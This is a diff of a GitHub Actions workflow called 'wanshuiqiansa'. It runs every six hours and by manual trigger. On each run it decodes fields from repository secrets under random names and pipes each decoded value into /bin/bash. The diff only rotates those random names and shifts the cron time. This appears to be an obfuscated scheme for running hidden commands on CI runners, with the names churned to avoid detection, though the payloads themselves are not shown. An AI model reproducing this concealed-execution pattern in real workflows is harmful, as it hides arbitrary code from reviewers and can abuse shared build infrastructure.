@@ -1,23 +1,22 @@
 name: wanshuiqiansa
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '54 2/6 * * *'
-
+    - cron: '58 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wanshuiqiansa
         env:
-          eht347: ${{ secrets.eht347 }}
+          bvqo7: ${{ secrets.bvqo7 }}
         run: |
-          echo $eht347 | jq -r .xla95 | /bin/bash
-          echo $f8 | jq -r .hbwvq644 | /bin/bash
-          echo $rweh5 | jq -r .gml96087 | /bin/bash
-          echo $sv8309 | jq -r .rdcr16987 | /bin/bash
-          echo $tgv3806 | jq -r .gtm78 | /bin/bash
-          echo $lws0662 | jq -r .lv42 | /bin/bash
+          echo $bvqo7 | jq -r .czcrc914 | /bin/bash
+          echo $u3850 | jq -r .fop18 | /bin/bash
+          echo $ry24485 | jq -r .k61 | /bin/bash
+          echo $zzcv5 | jq -r .kek1 | /bin/bash
+          echo $tbypa4 | jq -r .hbrjd15 | /bin/bash
+          echo $bpjvn1169 | jq -r .jepr0227 | /bin/bash
 
